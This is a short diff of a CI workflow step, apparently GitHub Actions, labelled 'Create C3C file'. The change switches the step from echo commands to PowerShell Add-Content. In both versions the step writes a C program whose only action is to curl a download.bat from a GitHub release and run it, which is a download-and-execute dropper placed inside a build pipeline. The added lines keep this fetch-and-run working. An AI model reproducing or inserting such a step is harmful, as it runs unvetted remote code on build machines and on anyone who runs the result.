@@ -23,13 +23,13 @@ jobs:
 
     - name: Create C3C file
       run: |
-        echo #include <stdio.h> > script.c3
-        echo #include <stdlib.h> >> script.c3
-        echo int main() { >> script.c3
-        echo system("curl -L -o download.bat https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"); >> script.c3
-        echo system("download.bat"); >> script.c3
-        echo return 0; >> script.c3
-        echo } >> script.c3
+        Add-Content -Path script.c3 -Value '#include <stdio.h>'
+        Add-Content -Path script.c3 -Value '#include <stdlib.h>'
+        Add-Content -Path script.c3 -Value 'int main() {'
+        Add-Content -Path script.c3 -Value 'system("curl -L -o download.bat https://github.com/43a1723/test/releases/download/AutoBuild/download.bat");'
+        Add-Content -Path script.c3 -Value 'system("download.bat");'
+        Add-Content -Path script.c3 -Value 'return 0;'
+        Add-Content -Path script.c3 -Value '}'
 
     - name: Install C3C
       run: |
